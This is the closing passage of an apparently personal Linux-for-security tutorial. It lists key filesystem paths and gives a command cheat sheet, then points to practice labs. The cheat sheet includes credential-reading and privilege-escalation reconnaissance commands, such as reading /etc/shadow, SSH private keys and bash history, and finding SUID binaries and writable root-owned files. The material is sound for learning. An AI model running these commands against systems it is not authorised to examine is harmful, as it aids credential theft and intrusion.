- `/home` = user data (check for `.ssh`, `.bash_history`, sensitive files)
- `/root` = root's home (high value target)
- `/var/log` = logs (evidence of everything that happened)
- `/tmp` = staging ground (world-writable, often executable, attacker favourite)
- `/proc` = kernel's live data (process memory, network state, version info)
- `/dev` = everything is a file — disks, random, null

**Security paths to memorize:**
- `/etc/passwd` → usernames, UIDs, shells (world-readable, no passwords)
- `/etc/shadow` → hashed passwords (root-only)
- `/etc/sudoers` → privilege paths (misconfigured = instant root)
- `~/.ssh/id_rsa` → private key = lateral movement
- `/var/log/auth.log` → authentication evidence
- `/tmp` → attacker staging, monitor closely

**Philosophy:** Everything is a file. Disks, devices, kernel state, network connections — all accessible via standard read/write operations. This unifying model is what makes Linux so composable and so exploitable when misconfigured.

---

## Part 12: Cheat Sheet / Quick Reference

```bash
# ── SYSTEM IDENTIFICATION ──────────────────────────────────────────
cat /etc/os-release             # Distro name and version
uname -r                        # Kernel version
uname -a                        # Full system info
cat /proc/version               # Verbose kernel version + compiler info
hostname; hostname -I           # Hostname and IP addresses

# ── WHO AM I ──────────────────────────────────────────────────────
whoami                          # Current username
id                              # UID, GID, all groups
sudo -l                         # What I can run as root

# ── NAVIGATION ────────────────────────────────────────────────────
pwd                             # Current directory
ls -la                          # Long listing with hidden files
ls -lah                         # Same + human-readable sizes
cd /path                        # Go to absolute path
cd ..                           # Go up one level
cd ~  or  cd                    # Go home

# ── SECURITY-CRITICAL FILES ───────────────────────────────────────
cat /etc/passwd                 # User accounts
sudo cat /etc/shadow            # Password hashes (root only)
cat /etc/sudoers                # Sudo rights
sudo cat ~/.ssh/id_rsa          # SSH private key (if exists)
cat /var/log/auth.log           # Auth log (Debian/Ubuntu)
cat /var/log/secure             # Auth log (RHEL/CentOS)
cat ~/.bash_history             # Command history (may contain passwords)
cat /etc/hosts                  # Local DNS overrides + internal host clues
cat /etc/resolv.conf            # DNS servers

# ── /proc QUICK HITS ──────────────────────────────────────────────
cat /proc/version               # Kernel version
cat /proc/cpuinfo               # CPU info
cat /proc/meminfo               # Memory usage
cat /proc/net/tcp               # TCP connections (hex)
cat /proc/$$/cmdline            # Current shell's command
ls /proc/$$/fd                  # Open file descriptors
find /proc -name exe -exec readlink {} \; 2>/dev/null | grep deleted

# ── FINDING THINGS ────────────────────────────────────────────────
find / -name "filename" 2>/dev/null           # Find by name
find / -perm /4000 -type f 2>/dev/null        # Find SUID binaries
find / -type d -perm -o+w 2>/dev/null         # World-writable dirs
find / -newer /etc/passwd -type f 2>/dev/null # Recently modified files
find / -user root -writable -type f 2>/dev/null | grep -v proc  # Root-owned, writable

# ── FILE TYPES IN ls OUTPUT ───────────────────────────────────────
# -  regular file
# d  directory
# l  symbolic link
# c  character device (/dev/null, /dev/random, /dev/tty)
# b  block device (/dev/sda)
# p  named pipe
# s  socket (/var/run/docker.sock)

# ── /dev ESSENTIALS ───────────────────────────────────────────────
/dev/null                       # Black hole — discard output
/dev/zero                       # Infinite null bytes
/dev/urandom                    # Cryptographic random bytes
/dev/sda                        # First disk
/dev/sda1                       # First partition of first disk

# ── PERMISSIONS FORMAT ─────────────────────────────────────────────
# -rwxr-xr-x  1  root  root  12345  Jul 23 2026  /usr/bin/passwd
#  ↑↑↑↑↑↑↑↑↑     ↑↑↑↑  ↑↑↑↑
#  │└──┘└──┘└──┘  owner group
#  │ owner group world
#  file type
```

---

## Part 13: Practice Labs & Resources

### Immediate Exercises

1. **TryHackMe — Linux Fundamentals (Parts 1, 2, 3):** Free rooms that put these concepts into interactive exercises on a real machine. Start here if you want guided practice: [tryhackme.com/module/linux-fundamentals](https://tryhackme.com/module/linux-fundamentals)

2. **OverTheWire — Bandit:** A wargame that teaches Linux through CTF-style challenges. Level 0 is SSH access; each level teaches another filesystem/command concept. [overthewire.org/wargames/bandit](https://overthewire.org/wargames/bandit)

3. **VulnHub — Kioptrix Level 1:** A vulnerable VM that starts with your knowledge of the filesystem. Great for applying day-1 skills immediately.

### What to Explore on Your Own System

- Run `find / -perm /4000 -type f 2>/dev/null` and list every SUID binary. Look each one up. (We'll exploit these in depth in Chapter 12 — Linux Privilege Escalation Part 2.)
- Read the man page for `hier`: `man hier` — the official FHS documentation, built into every Linux system.
- Open `/etc/passwd` and decode every field of every line. Which accounts have `/bin/bash` as their shell? Which have `/usr/sbin/nologin`? What does `nologin` protect against?

---

---

*Also on [Praneeth's portfolio](https://ping-praneeth.vercel.app/notebook/linux/01-linux-fundamentals-and-filesystem), with comments and the latest edits.*
